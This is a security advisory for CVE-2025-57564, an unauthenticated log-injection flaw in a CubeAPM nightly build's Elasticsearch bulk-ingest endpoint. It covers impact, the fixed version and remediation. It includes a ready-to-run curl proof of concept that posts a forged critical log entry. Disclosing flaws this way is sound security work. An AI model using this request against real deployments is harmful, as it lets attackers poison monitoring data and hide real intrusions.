Description:
A critical vulnerability exists in CubeAPM nightly-2025-08-01-1 that allows unauthenticated log injection through the /api/logs/insert/elasticsearch/_bulk endpoint.
The endpoint accepts bulk log data without requiring authentication or validation, allowing remote attackers to inject arbitrary log entries directly into the observability pipeline.
This can lead to misleading operational data, alert obfuscation, and potential resource exhaustion.

Proof of Concept (PoC):

#curl -X POST "http://<Instance>:3130/api/logs/insert/elasticsearch/_bulk" \
  -H "Content-Type: application/x-ndjson" \
  --data-binary $'{ "index": { "_index": "logs" } }\n{ "@timestamp": "2025-08-07T09:20:00Z", "level": "critical", "message": "Before request [GET /kuchbhi, client=10.6.66.66]", "application": "bla", "service.name": "bla", "env": "dev", "subsystemName": "aws-waf-dev" }'


This request successfully injects arbitrary log data without any authentication.

Impact:

1. False Log Injection: Attackers can forge arbitrary log entries, misleading monitoring systems and analysts.

2. Log Poisoning: Ingested data may corrupt dashboards and metrics, affecting detection and response.

3. Attack Obfuscation: Injected noise can conceal real indicators of compromise.

4. Denial of Service: Excessive unauthenticated injection can overload the logging pipeline.

Affected Endpoint:
POST /api/logs/insert/elasticsearch/_bulk

Affected Version:
CubeAPM nightly-2025-08-01-1

Fixed In:
CubeAPM nightly-2025-09-19-1

Severity:
High

Suggested Remediation:

Require authentication and authorization for all log ingestion endpoints.

Validate input structure and sanitize fields.

Restrict access to trusted services only.

Credits:
Discovered by Prasann Nuwal

Reference: CVE-2025-57564
